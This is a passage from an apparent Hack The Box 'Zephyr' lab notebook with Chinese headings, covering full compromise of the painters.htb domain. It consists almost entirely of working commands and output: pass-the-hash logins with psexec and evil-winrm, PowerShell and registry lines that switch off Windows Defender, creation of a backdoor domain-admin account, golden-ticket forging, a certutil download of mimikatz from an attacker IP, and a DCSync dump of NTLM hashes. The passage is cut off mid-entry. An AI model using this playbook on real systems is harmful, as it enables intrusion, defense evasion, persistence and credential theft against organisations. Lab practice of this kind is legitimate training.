[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
painters\administrator
```

## psexec 
```plain
proxychains -q impacket-psexec -hashes 'aad3b435b51404eeaad3b435b51404ee:5bdd6a33efe43f0dc7e3b2435579aa53' painters.htb/Administrator@192.168.110.55
```

## evil-winrm
```plain
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# proxychains -q evil-winrm -i 192.168.110.55 -u Administrator -H '5bdd6a33efe43f0dc7e3b2435579aa53'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                    
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                               
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## Getflag
```plain
C:\Users\Administrator\Desktop>type flag.txt
ZEPHYR{P41n73r_D0m41n_D0m1n4nc3}
```

## 关闭防护
```plain
powershell -ep bypass -nop -c "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableScriptScanning $true"
```

```plain
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
```

```plain
powershell -ep bypass -c "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\Users\Public'"
```

## 权限维持
### atexec
```plain
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# proxychains -q impacket-atexec -hashes 'aad3b435b51404eeaad3b435b51404ee:5bdd6a33efe43f0dc7e3b2435579aa53' \
    painters.htb/Administrator@192.168.110.55 'net group "domain admins" heathc1iff /add /domain'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] This will work ONLY on Windows >= Vista
[*] Creating task \XrqkBypc
[*] Running task \XrqkBypc
[*] Deleting task \XrqkBypc
[*] Attempting to read ADMIN$\Temp\XrqkBypc.tmp
[*] Attempting to read ADMIN$\Temp\XrqkBypc.tmp
[-] SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
[*] When STATUS_OBJECT_NAME_NOT_FOUND is received, try running again. It might work

┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# proxychains -q impacket-atexec -hashes 'aad3b435b51404eeaad3b435b51404ee:5bdd6a33efe43f0dc7e3b2435579aa53' \
    painters.htb/Administrator@192.168.110.55 'net user heathc1iff'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] This will work ONLY on Windows >= Vista
[*] Creating task \jWyxoeQO
[*] Running task \jWyxoeQO
[*] Deleting task \jWyxoeQO
[*] Attempting to read ADMIN$\Temp\jWyxoeQO.tmp
[*] Attempting to read ADMIN$\Temp\jWyxoeQO.tmp
[-] SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
[*] When STATUS_OBJECT_NAME_NOT_FOUND is received, try running again. It might work
```

### 添加域控用户
> 添加域管用户
>

```plain
net user heathc1iff Pass@123 /add /domain
net group "domain admins" heathc1iff /add /domain
```

### 黄金票据生成
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# impacket-ticketer \
-domain painters.htb \
-domain-sid S-1-5-21-1470357062-2280927533-300823338 \
-nthash b59ffc1f7fcd615577dab8436d3988fc \
-user-id 500 \
Administrator
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for painters.htb/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# export KRB5CCNAME=Administrator.ccache
```

## Mimikatz
### upload
```plain
C:\Users\Public>certutil.exe -urlcache -split -f http://10.10.16.8/mimikatz.exe
****  Online  ****
  000000  ...
  131308
CertUtil: -URLCache command completed successfully.
```

### lsadump::dcsync
```plain
C:\Windows\system32>C:\Users\Public\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:painters.htb /all" exit

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::dcsync /domain:painters.htb /all
[DC] 'painters.htb' will be the domain
[DC] 'DC.painters.htb' will be the DC server
[DC] Exporting domain 'painters.htb'

Object RDN           : painters


Object RDN           : LostAndFound


Object RDN           : Deleted Objects


Object RDN           : Users


Object RDN           : Computers


Object RDN           : System


Object RDN           : WinsockServices


Object RDN           : RpcServices


Object RDN           : FileLinks


Object RDN           : VolumeTable


Object RDN           : ObjectMoveTable


Object RDN           : Default Domain Policy


Object RDN           : AppCategories


Object RDN           : Meetings


Object RDN           : Policies


Object RDN           : User


Object RDN           : Machine


Object RDN           : {6AC1786C-016F-11D2-945F-00C04fB984F9}


Object RDN           : User


Object RDN           : Machine


Object RDN           : RAS and IAS Servers Access Check


Object RDN           : File Replication Service


Object RDN           : Dfs-Configuration


Object RDN           : IP Security


Object RDN           : ipsecPolicy{72385230-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecISAKMPPolicy{72385231-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{72385232-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{59319BE2-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17}


Object RDN           : ipsecPolicy{72385236-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecISAKMPPolicy{72385237-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{59319C04-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecISAKMPPolicy{7238523D-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{7238523E-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{59319BF3-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNFA{6A1F5C6F-72B7-11D2-ACF0-0060B0ECCA17}


Object RDN           : ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17}


Object RDN           : ipsecNegotiationPolicy{59319BDF-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNegotiationPolicy{59319BF0-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNegotiationPolicy{59319C01-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNegotiationPolicy{72385233-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNegotiationPolicy{7238523F-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNegotiationPolicy{7238523B-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecFilter{7238523A-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecFilter{72385235-70FA-11D1-864C-14A300000000}


Object RDN           : ComPartitions


Object RDN           : ComPartitionSets


Object RDN           : WMIPolicy


Object RDN           : PolicyTemplate


Object RDN           : SOM


Object RDN           : PolicyType


Object RDN           : WMIGPO


Object RDN           : DomainUpdates


Object RDN           : Operations


Object RDN           : ab402345-d3c3-455d-9ff7-40268a1099b6


Object RDN           : bab5f54d-06c8-48de-9b87-d78b796564e4


Object RDN           : f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5


Object RDN           : 2416c60a-fe15-4d7a-a61e-dffd5df864d3


Object RDN           : 7868d4c8-ac41-4e05-b401-776280e8e9f1


Object RDN           : 860c36ed-5241-4c62-a18b-cf6ff9994173


Object RDN           : 0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e


Object RDN           : a86fe12a-0f62-4e2a-b271-d27f601f8182


Object RDN           : d85c0bfd-094f-4cad-a2b5-82ac9268475d


Object RDN           : 6ada9ff7-c9df-45c1-908e-9fef2fab008a


Object RDN           : 10b3ad2a-6883-4fa7-90fc-6377cbdc1b26


Object RDN           : 98de1d3e-6611-443b-8b4e-f4337f1ded0b


Object RDN           : f607fd87-80cf-45e2-890b-6cf97ec0e284


Object RDN           : 9cac1f66-2167-47ad-a472-2a13251310e4


Object RDN           : 6ff880d6-11e7-4ed1-a20f-aac45da48650


Object RDN           : 446f24ea-cfd5-4c52-8346-96e170bcb912


Object RDN           : 51cba88b-99cf-4e16-bef2-c427b38d0767


Object RDN           : a3dac986-80e7-4e59-a059-54cb1ab43cb9


Object RDN           : 293f0798-ea5c-4455-9f5d-45f33a30703b


Object RDN           : 5c82b233-75fc-41b3-ac71-c69592e6bf15


Object RDN           : 7ffef925-405b-440a-8d58-35e8cd6e98c3


Object RDN           : 4dfbb973-8a62-4310-a90c-776e00f83222


Object RDN           : 8437C3D8-7689-4200-BF38-79E4AC33DFA0


Object RDN           : 7cfb016c-4f87-4406-8166-bd9df943947f


Object RDN           : f7ed4553-d82b-49ef-a839-2f38a36bb069


Object RDN           : 8ca38317-13a4-4bd4-806f-ebed6acb5d0c


Object RDN           : 3c784009-1f57-4e2a-9b04-6915c9e71961


Object RDN           : 6bcd5678-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5679-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567a-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567b-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567c-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567d-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567e-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567f-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5680-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5681-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5682-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5683-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5684-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5685-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5686-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5687-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5688-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5689-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd568a-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd568b-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd568c-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd568d-8314-11d6-977b-00c04f613221


Object RDN           : 3051c66f-b332-4a73-9a20-2d6a7d6e6a1c


Object RDN           : 3e4f4182-ac5d-4378-b760-0eab2de593e2


Object RDN           : c4f17608-e611-11d6-9793-00c04f613221


Object RDN           : 13d15cf0-e6c8-11d6-9793-00c04f613221


Object RDN           : 8ddf6913-1c7b-4c59-a5af-b9ca3b3d2c4c


Object RDN           : dda1d01d-4bd7-4c49-a184-46f9241b560e


Object RDN           : a1789bfb-e0a2-4739-8cc0-e77d892d080a


Object RDN           : 61b34cb0-55ee-4be9-b595-97810b92b017


Object RDN           : 57428d75-bef7-43e1-938b-2e749f5a8d56


Object RDN           : ebad865a-d649-416f-9922-456b53bbb5b8


Object RDN           : 0b7fb422-3609-4587-8c2e-94b10f67d1bf


Object RDN           : 2951353e-d102-4ea5-906c-54247eeec741


Object RDN           : 71482d49-8870-4cb3-a438-b6fc9ec35d70


Object RDN           : aed72870-bf16-4788-8ac7-22299c8207f1


Object RDN           : f58300d1-b71a-4DB6-88a1-a8b9538beaca


Object RDN           : 231fb90b-c92a-40c9-9379-bacfc313a3e3


Object RDN           : 4aaabc3a-c416-4b9c-a6bb-4b453ab1c1f0


Object RDN           : 9738c400-7795-4d6e-b19d-c16cd6486166


Object RDN           : de10d491-909f-4fb0-9abb-4b7865c0fe80


Object RDN           : b96ed344-545a-4172-aa0c-68118202f125


Object RDN           : 4c93ad42-178a-4275-8600-16811d28f3aa


Object RDN           : c88227bc-fcca-4b58-8d8a-cd3d64528a02


Object RDN           : 5e1574f6-55df-493e-a671-aaeffca6a100


Object RDN           : d262aae8-41f7-48ed-9f35-56bbb677573d


Object RDN           : 82112ba0-7e4c-4a44-89d9-d46c9612bf91


Object RDN           : c3c927a6-cc1d-47c0-966b-be8f9b63d991


Object RDN           : 54afcfb9-637a-4251-9f47-4d50e7021211


Object RDN           : f4728883-84dd-483c-9897-274f2ebcf11e


Object RDN           : ff4f9d27-7157-4cb0-80a9-5d6f2b14c8ff


Object RDN           : 83C53DA7-427E-47A4-A07A-A324598B88F7


Object RDN           : C81FC9CC-0130-4FD1-B272-634D74818133


Object RDN           : E5F9E791-D96D-4FC9-93C9-D53E1DC439BA


Object RDN           : e6d5fd00-385d-4e65-b02d-9da3493ed850


Object RDN           : 3a6b3fbf-3168-4312-a10d-dd5b3393952d


Object RDN           : 7F950403-0AB3-47F9-9730-5D7B0269F9BD


Object RDN           : 434bb40d-dbc9-4fe7-81d4-d57229f7b080


Object RDN           : A0C238BA-9E30-4EE6-80A6-43F731E9A5CD


Object RDN           : Windows2003Update


Object RDN           : ActiveDirectoryUpdate


Object RDN           : Password Settings Container


Object RDN           : PSPs


Object RDN           : Domain Controllers


Object RDN           : Infrastructure


Object RDN           : ForeignSecurityPrincipals


Object RDN           : Program Data


Object RDN           : Microsoft


Object RDN           : NTDS Quotas


Object RDN           : Managed Service Accounts


Object RDN           : TPM Devices


Object RDN           : Keys


Object RDN           : Guest

** SAM ACCOUNT **

SAM Username         : Guest
User Account Control : 00010222 ( ACCOUNTDISABLE PASSWD_NOTREQD NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-501
Object Relative ID   : 501

Credentials:

Object RDN           : Builtin


Object RDN           : S-1-5-4


Object RDN           : S-1-5-11


Object RDN           : Remote Desktop Users

** SAM ACCOUNT **

SAM Username         : Remote Desktop Users
Object Security ID   : S-1-5-32-555
Object Relative ID   : 555

Credentials:

Object RDN           : Network Configuration Operators

** SAM ACCOUNT **

SAM Username         : Network Configuration Operators
Object Security ID   : S-1-5-32-556
Object Relative ID   : 556

Credentials:

Object RDN           : Performance Monitor Users

** SAM ACCOUNT **

SAM Username         : Performance Monitor Users
Object Security ID   : S-1-5-32-558
Object Relative ID   : 558

Credentials:

Object RDN           : Performance Log Users

** SAM ACCOUNT **

SAM Username         : Performance Log Users
Object Security ID   : S-1-5-32-559
Object Relative ID   : 559

Credentials:

Object RDN           : Distributed COM Users

** SAM ACCOUNT **

SAM Username         : Distributed COM Users
Object Security ID   : S-1-5-32-562
Object Relative ID   : 562

Credentials:

Object RDN           : S-1-5-17


Object RDN           : IIS_IUSRS

** SAM ACCOUNT **

SAM Username         : IIS_IUSRS
Object Security ID   : S-1-5-32-568
Object Relative ID   : 568

Credentials:

Object RDN           : Cryptographic Operators

** SAM ACCOUNT **

SAM Username         : Cryptographic Operators
Object Security ID   : S-1-5-32-569
Object Relative ID   : 569

Credentials:

Object RDN           : Event Log Readers

** SAM ACCOUNT **

SAM Username         : Event Log Readers
Object Security ID   : S-1-5-32-573
Object Relative ID   : 573

Credentials:

Object RDN           : Certificate Service DCOM Access

** SAM ACCOUNT **

SAM Username         : Certificate Service DCOM Access
Object Security ID   : S-1-5-32-574
Object Relative ID   : 574

Credentials:

Object RDN           : RDS Remote Access Servers

** SAM ACCOUNT **

SAM Username         : RDS Remote Access Servers
Object Security ID   : S-1-5-32-575
Object Relative ID   : 575

Credentials:

Object RDN           : RDS Endpoint Servers

** SAM ACCOUNT **

SAM Username         : RDS Endpoint Servers
Object Security ID   : S-1-5-32-576
Object Relative ID   : 576

Credentials:

Object RDN           : RDS Management Servers

** SAM ACCOUNT **

SAM Username         : RDS Management Servers
Object Security ID   : S-1-5-32-577
Object Relative ID   : 577

Credentials:

Object RDN           : Hyper-V Administrators

** SAM ACCOUNT **

SAM Username         : Hyper-V Administrators
Object Security ID   : S-1-5-32-578
Object Relative ID   : 578

Credentials:

Object RDN           : Access Control Assistance Operators

** SAM ACCOUNT **

SAM Username         : Access Control Assistance Operators
Object Security ID   : S-1-5-32-579
Object Relative ID   : 579

Credentials:

Object RDN           : Storage Replica Administrators

** SAM ACCOUNT **

SAM Username         : Storage Replica Administrators
Object Security ID   : S-1-5-32-582
Object Relative ID   : 582

Credentials:

Object RDN           : Domain Computers

** SAM ACCOUNT **

SAM Username         : Domain Computers
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-515
Object Relative ID   : 515

Credentials:

Object RDN           : Cert Publishers

** SAM ACCOUNT **

SAM Username         : Cert Publishers
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-517
Object Relative ID   : 517

Credentials:

Object RDN           : Domain Users

** SAM ACCOUNT **

SAM Username         : Domain Users
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-513
Object Relative ID   : 513

Credentials:

Object RDN           : Domain Guests

** SAM ACCOUNT **

SAM Username         : Domain Guests
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-514
Object Relative ID   : 514

Credentials:

Object RDN           : RAS and IAS Servers

** SAM ACCOUNT **

SAM Username         : RAS and IAS Servers
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-553
Object Relative ID   : 553

Credentials:

Object RDN           : Incoming Forest Trust Builders

** SAM ACCOUNT **

SAM Username         : Incoming Forest Trust Builders
Object Security ID   : S-1-5-32-557
Object Relative ID   : 557

Credentials:

Object RDN           : Terminal Server License Servers

** SAM ACCOUNT **

SAM Username         : Terminal Server License Servers
Object Security ID   : S-1-5-32-561
Object Relative ID   : 561

Credentials:

Object RDN           : Users

** SAM ACCOUNT **

SAM Username         : Users
Object Security ID   : S-1-5-32-545
Object Relative ID   : 545

Credentials:

Object RDN           : Guests

** SAM ACCOUNT **

SAM Username         : Guests
Object Security ID   : S-1-5-32-546
Object Relative ID   : 546

Credentials:

Object RDN           : Group Policy Creator Owners

** SAM ACCOUNT **

SAM Username         : Group Policy Creator Owners
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-520
Object Relative ID   : 520

Credentials:

Object RDN           : Pre-Windows 2000 Compatible Access

** SAM ACCOUNT **

SAM Username         : Pre-Windows 2000 Compatible Access
Object Security ID   : S-1-5-32-554
Object Relative ID   : 554

Credentials:

Object RDN           : S-1-5-9


Object RDN           : Windows Authorization Access Group

** SAM ACCOUNT **

SAM Username         : Windows Authorization Access Group
Object Security ID   : S-1-5-32-560
Object Relative ID   : 560

Credentials:

Object RDN           : 6E157EDF-4E72-4052-A82A-EC3F91021A22


Object RDN           : Allowed RODC Password Replication Group

** SAM ACCOUNT **

SAM Username         : Allowed RODC Password Replication Group
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-571
Object Relative ID   : 571

Credentials:

Object RDN           : Enterprise Read-only Domain Controllers

** SAM ACCOUNT **

SAM Username         : Enterprise Read-only Domain Controllers
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-498
Object Relative ID   : 498

Credentials:

Object RDN           : Denied RODC Password Replication Group

** SAM ACCOUNT **

SAM Username         : Denied RODC Password Replication Group
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-572
Object Relative ID   : 572

Credentials:

Object RDN           : Cloneable Domain Controllers

** SAM ACCOUNT **

SAM Username         : Cloneable Domain Controllers
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-522
Object Relative ID   : 522

Credentials:

Object RDN           : Protected Users

** SAM ACCOUNT **

SAM Username         : Protected Users
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-525
Object Relative ID   : 525

Credentials:

Object RDN           : DnsAdmins

** SAM ACCOUNT **

SAM Username         : DnsAdmins
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-1101
Object Relative ID   : 1101

Credentials:

Object RDN           : DnsUpdateProxy

** SAM ACCOUNT **

SAM Username         : DnsUpdateProxy
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-1102
Object Relative ID   : 1102

Credentials:

Object RDN           : MicrosoftDNS


Object RDN           : RootDNSServers


Object RDN           : @


Object RDN           : a.root-servers.net


Object RDN           : b.root-servers.net


Object RDN           : c.root-servers.net


Object RDN           : d.root-servers.net


Object RDN           : e.root-servers.net


Object RDN           : f.root-servers.net


Object RDN           : g.root-servers.net


Object RDN           : h.root-servers.net


Object RDN           : i.root-servers.net


Object RDN           : j.root-servers.net


Object RDN           : k.root-servers.net


Object RDN           : l.root-servers.net


Object RDN           : m.root-servers.net


Object RDN           : DFSR-GlobalSettings


Object RDN           : Domain System Volume


Object RDN           : Content


Object RDN           : SYSVOL Share


Object RDN           : Topology


Object RDN           : DC


Object RDN           : Domain System Volume


Object RDN           : Server


Object RDN           : DFSR-LocalSettings


Object RDN           : SYSVOL Subscription


Object RDN           : AdminSDHolder


Object RDN           : Key Admins

** SAM ACCOUNT **

SAM Username         : Key Admins
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-526
Object Relative ID   : 526

Credentials:

Object RDN           : Enterprise Admins

** SAM ACCOUNT **

SAM Username         : Enterprise Admins
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-519
Object Relative ID   : 519

Credentials:

Object RDN           : Enterprise Key Admins

** SAM ACCOUNT **

SAM Username         : Enterprise Key Admins
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-527
Object Relative ID   : 527

Credentials:

Object RDN           : Domain Admins

** SAM ACCOUNT **

SAM Username         : Domain Admins
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-512
Object Relative ID   : 512

Credentials:

Object RDN           : Schema Admins

** SAM ACCOUNT **

SAM Username         : Schema Admins
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-518
Object Relative ID   : 518

Credentials:

Object RDN           : Account Operators

** SAM ACCOUNT **

SAM Username         : Account Operators
Object Security ID   : S-1-5-32-548
Object Relative ID   : 548

Credentials:

Object RDN           : Replicator

** SAM ACCOUNT **

SAM Username         : Replicator
Object Security ID   : S-1-5-32-552
Object Relative ID   : 552

Credentials:

Object RDN           : Backup Operators

** SAM ACCOUNT **

SAM Username         : Backup Operators
Object Security ID   : S-1-5-32-551
Object Relative ID   : 551

Credentials:

Object RDN           : Server Operators

** SAM ACCOUNT **

SAM Username         : Server Operators
Object Security ID   : S-1-5-32-549
Object Relative ID   : 549

Credentials:

Object RDN           : Print Operators

** SAM ACCOUNT **

SAM Username         : Print Operators
Object Security ID   : S-1-5-32-550
Object Relative ID   : 550

Credentials:

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: b59ffc1f7fcd615577dab8436d3988fc

Object RDN           : Domain Controllers

** SAM ACCOUNT **

SAM Username         : Domain Controllers
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-516
Object Relative ID   : 516

Credentials:

Object RDN           : Read-only Domain Controllers

** SAM ACCOUNT **

SAM Username         : Read-only Domain Controllers
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-521
Object Relative ID   : 521

Credentials:

Object RDN           : Configuration


Object RDN           : DomainDnsZones


Object RDN           : ForestDnsZones


Object RDN           : Gavin Cox

** SAM ACCOUNT **

SAM Username         : gavin
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-1108
Object Relative ID   : 1108

Credentials:
  Hash NTLM: cb8ec920398da9fbb7c33b7b613b28d5

Object RDN           : Tom Jones

** SAM ACCOUNT **

SAM Username         : tom
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-1110
Object Relative ID   : 1110

Credentials:
  Hash NTLM: dc51a409ab6cf835cbb9e471f27d8bc6

Object RDN           : Administrators

** SAM ACCOUNT **

SAM Username         : Administrators
Object Security ID   : S-1-5-32-544
Object Relative ID   : 544

Credentials:

Object RDN           : BCKUPKEY_d561956f-a75e-475b-a9e1-bff731b90e66 Secret


Object RDN           : BCKUPKEY_P Secret


Object RDN           : BCKUPKEY_9c9b3f5c-fc94-40fc-8791-8f36cbb281fc Secret


Object RDN           : BCKUPKEY_PREFERRED Secret


Object RDN           : Daniel Morris

** SAM ACCOUNT **

SAM Username         : daniel
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-1109
Object Relative ID   : 1109

Credentials:
  Hash NTLM: b084c663ad3f214e516e6f89c81c80d7

Object RDN           : Matt Bach

** SAM ACCOUNT **

SAM Username         : Matt
User Account Control : 00010280 ( ENCRYPTED_TEXT_PASSWORD_ALLOWED NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-4101
Object Relative ID   : 4101

Credentials:
  Hash NTLM: 5e3c0abbe0b4163c5612afe25c69ced6

Object RDN           : Remote Management Users

** SAM ACCOUNT **

SAM Username         : Remote Management Users
Object Security ID   : S-1-5-32-580
Object Relative ID   : 580

Credentials:

Object RDN           : MAINTENANCE

** SAM ACCOUNT **

SAM Username         : MAINTENANCE$
User Account Control : 00001000 ( WORKSTATION_TRUST_ACCOUNT )
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-2101
Object Relative ID   : 2101

Credentials:
  Hash NTLM: 6db918e3d0a23093360a17711ac9c59a

Object RDN           : {31B2F340-016D-11D2-945F-00C04FB984F9}


Object RDN           : RID Manager$


Object RDN           : RID Set


Object RDN           : DC

** SAM ACCOUNT **

SAM Username         : DC$
User Account Control : 00082000 ( SERVER_TRUST_ACCOUNT TRUSTED_FOR_DELEGATION )
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-1000
Object Relative ID   : 1000

Credentials:
  Hash NTLM: 5869ab656006ee71af41d437a6788093

Object RDN           : PNT-SVRSVC

** SAM ACCOUNT **

SAM Username         : PNT-SVRSVC$
User Account Control : 00001000 ( WORKSTATION_TRUST_ACCOUNT )
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-1103
Object Relative ID   : 1103

Credentials:
  Hash NTLM: c206d294c947cecc0e60955004ff96c5

Object RDN           : PNT-SVRPSB

** SAM ACCOUNT **

SAM Username         : PNT-SVRPSB$
User Account Control : 00001000 ( WORKSTATION_TRUST_ACCOUNT )
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-1105
Object Relative ID   : 1105

Credentials:
  Hash NTLM: 7fc6b6b4b44a96617b5829a888b5a85a

Object RDN           : PNT-SVRBPA

** SAM ACCOUNT **

SAM Username         : PNT-SVRBPA$
User Account Control : 00001000 ( WORKSTATION_TRUST_ACCOUNT )
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-1104
Object Relative ID   : 1104

Credentials:
  Hash NTLM: 2dfcebbe9f5f4cb3bf98032887b3d7b6

Object RDN           : WORKSTATION-1

** SAM ACCOUNT **

SAM Username         : WORKSTATION-1$
User Account Control : 00001000 ( WORKSTATION_TRUST_ACCOUNT )
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-2103
Object Relative ID   : 2103

Credentials:
  Hash NTLM: 9ab46ef513f6f74ddf1ab492b8f542fa

Object RDN           : Riley Smart

** SAM ACCOUNT **

SAM Username         : riley
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-1106
Object Relative ID   : 1106

Credentials:
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Object RDN           : zsm.local


Object RDN           : ZSM$

** SAM ACCOUNT **

SAM Username         : ZSM$
User Account Control : 00000820 ( PASSWD_NOTREQD INTERDOMAIN_TRUST_ACCOUNT )
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-2102
Object Relative ID   : 2102

Credentials:
  Hash NTLM: e32c342fb51f05ec34a78483ba5167ba

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 5bdd6a33efe43f0dc7e3b2435579aa53

Object RDN           : Web Service

** SAM ACCOUNT **

SAM Username         : web_svc
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-1111
Object Relative ID   : 1111

Credentials:
  Hash NTLM: 502472f625746727fa99566032383067

Object RDN           : Blake Morris

** SAM ACCOUNT **

SAM Username         : blake
